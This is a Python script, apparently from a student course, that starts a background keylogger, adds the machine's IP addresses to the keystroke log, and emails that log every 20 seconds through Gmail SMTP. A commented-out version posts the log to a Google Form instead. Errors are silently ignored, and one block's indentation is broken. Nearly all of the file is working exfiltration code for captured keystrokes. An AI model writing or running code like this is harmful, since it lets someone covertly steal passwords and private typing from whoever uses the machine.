#!/bin/python3

import requests
import time
import os 
from pynput.keyboard import Listener
import smtplib
from email.message import EmailMessage
import config

startlog = time.time()

os.system("(python3 /home/student/ITP270_001N_FALL2022/Python_Learning/keylogger.py &) ; (ifconfig | grep -w 'inet' >> keyboard_Input.txt &") 
time.sleep(1)

def send_request():
    #form_input = open("/home/student/ITP270_001N_FALL2022/Python_Learning/keyboard_Input.txt")
    #form_send = form_input.read()
    #url = 'https://docs.google.com/forms/u/0/d/e/1FAIpQLSd63z5rAVie4clZ-PttFpHwCUJuhBeU6cCIbgsPGiZqbOz19g/formResponse'
    #form_data = {'entry.839337160' : f"'{form_send}'"}
    #r = requests.post(url, data=form_data)
    with open('keyboard_Input.txt') as msgcontent:
    msg = EmailMessage()
    msg.set_content(msgcontent.read())
    try:
        msg['Subject'] = f'The contents of {"keyboard_Input.txt"}'
        msg['From'] = 'ims2324@email.vccs.edu'
        msg['To'] = 'ims2324@email.vccs.edu'
        server = smtplib.SMTP('smtp.gmail.com:587')
        server.ehlo()
        server.starttls()
        server.login(config.EMAIL_ADDRESS, config.PASSWORD)
        server.send_message(msg)
        server.quit()
    except:
        pass


def interval():
    global startlog
    if time.time() - 20 > startlog:
        print('its been 20 secs ')
        send_request()
        startlog = time.time()

counter = 0
while True:
    counter += 1
    print(counter)
    interval()
    time.sleep(1)